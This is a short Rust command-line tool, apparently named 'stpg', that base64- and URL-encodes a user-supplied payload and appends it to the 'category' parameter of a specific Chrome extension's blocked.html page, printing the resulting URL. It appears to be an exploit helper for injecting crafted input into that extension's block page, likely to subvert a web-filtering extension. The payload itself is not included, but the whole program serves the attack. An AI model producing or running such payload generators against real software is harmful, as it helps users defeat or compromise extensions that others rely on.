use base64::{Engine as _, engine::general_purpose};
use urlencoding::encode;
use std::env;
use std::process;

fn main() {
    let url = "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/blocked.html?category=";
    let args: Vec<String> = env::args().collect();
    if args.len() <= 1 || args.len() > 2 {
        println!("Usage: stpg [payload]");
        process::exit(0x0100);
    }
    let payload = &args[1];
    let plb64: String = general_purpose::STANDARD_NO_PAD.encode(payload.as_bytes());
    println!("{}{}", url, encode(&plb64));
}